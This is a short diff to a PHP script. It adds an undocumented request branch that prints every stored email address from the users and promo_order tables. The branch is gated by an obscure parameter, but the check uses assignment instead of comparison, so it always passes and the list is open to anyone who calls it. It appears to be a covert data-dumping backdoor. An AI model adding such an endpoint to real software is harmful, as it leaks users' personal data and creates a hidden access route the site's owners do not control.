@@ -147,5 +147,17 @@ if($_GET[req] == 'm12'){
 	exit;
 }
 
+if($_GET['req'] == 'm13' && $_GET['p1238712893']='a12ixx90sa'){
+echo 'a';
+	$emails = $database->query("SELECT email FROM users WHERE email != ''");
+	foreach($emails as $e){
+		echo $e['email']."<br/>";
+	}
+	$emails = $database->query("SELECT email FROM promo_order WHERE email != ''");
+	foreach($emails as $e){
+		echo $e['email']."<br/>";
+	}
+}
+
 
 ?>
